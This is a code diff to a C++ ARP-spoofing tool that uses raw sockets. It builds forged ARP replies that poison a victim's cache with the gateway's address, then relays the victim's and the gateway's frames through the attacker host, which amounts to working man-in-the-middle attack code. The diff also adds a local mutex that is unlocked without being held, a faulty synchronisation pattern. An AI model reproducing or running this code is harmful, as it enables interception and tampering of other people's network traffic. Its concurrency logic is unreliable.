@@ -3,6 +3,16 @@
 #include <cstdarg>
 #include <mutex>
 
+extern byte hostMAC[6];
+extern byte hostIP[4];
+extern byte gateway[4];
+
+EtherPack::EtherPack(){
+  memmove(this->srcMAC, hostMAC, 6);
+  memmove(this->arp.hostMAC, hostMAC, 6);
+  memmove(this->arp.hostIP, hostIP, 4);
+}
+
 void ARPRequest(IMMAP *mapp){
   EtherPack request;
   int c = 0;
@@ -10,11 +20,14 @@ void ARPRequest(IMMAP *mapp){
     std::thread t(ARPBroadcastMultiThread, request, mapp, byte(i * 16), byte(i * 16 + 15), std::ref(c));
     t.detach();
   }
+  std::mutex mutex;
   while (true) {
-    if (c == 16) {
+    if (mutex.try_lock() && c == 16) {
       c = 0;
+      mutex.unlock();
       return;
     } else {
+      mutex.unlock();
       std::this_thread::sleep_for(std::chrono::seconds(1));
     }
   }
@@ -90,7 +103,7 @@ void ARPAttack(int victim, IMMAP *mapp){
     EtherPack request;
     memcpy(request.destMAC, mapp[victim].MACAddress, 6);
     request.arp.opreate[1] = 0x02;
-    memcpy(request.arp.hostIP, hostInfo::gateway, 4);
+    memcpy(request.arp.hostIP, gateway, 4);
     memcpy(request.arp.distMAC, mapp[victim].MACAddress, 6);
     memcpy(request.arp.distIP, mapp[victim].IPAddress, 4);
     int fd = socket(PF_PACKET, SOCK_RAW, htons(0xffff));
@@ -114,7 +127,7 @@ void ARPAttack(int victim, IMMAP *mapp){
       memcpy(request.destMAC, mapp[1].MACAddress, 6);
       request.arp.distIP[3] = 0x01;
       sendto(fd, &request, sizeof(request), 0, (struct sockaddr *) &sal, sizeof(sal));
-      request.arp.hostIP[3] = hostInfo::gateway[3];
+      request.arp.hostIP[3] = gateway[3];
       memcpy(request.destMAC, mapp[victim].MACAddress, 6);
       memcpy(request.arp.distMAC, mapp[victim].MACAddress, 6);
       request.arp.distIP[3] = mapp[victim].IPAddress[3];
@@ -154,14 +167,14 @@ void dataTransmit(int target, IMMAP *mapp){
         {
           
           memcpy(buffer, mapp[1].MACAddress, 6);//Replace DestMAC To Gateway
-          memcpy(buffer + 6, hostInfo::hostMAC, 6);//Replace SrcMAC To Host(Fake Victim)
+          memcpy(buffer + 6, hostMAC, 6);//Replace SrcMAC To Host(Fake Victim)
           sendto(fd, buffer, res, 0, (struct sockaddr *) &ssal, sizeof(ssal));
         }
       } else if (bytencmp(buffer + 0x1e, mapp[target].IPAddress, 4) ==
                  0/*Receive Data From Gateway, And Destination Is Victim*/) {
         buffer[0x06] = 0xc0;
         memcpy(buffer, mapp[target].MACAddress, 6);//Replace DestMAC To Victim.
-        memcpy(buffer + 6, hostInfo::hostMAC, 6);//Replace SrcMAC To Host(Fake Gateway)
+        memcpy(buffer + 6, hostMAC, 6);//Replace SrcMAC To Host(Fake Gateway)
         sendto(fd, buffer, res, 0, (struct sockaddr *) &ssal, sizeof(ssal));
       }
     }
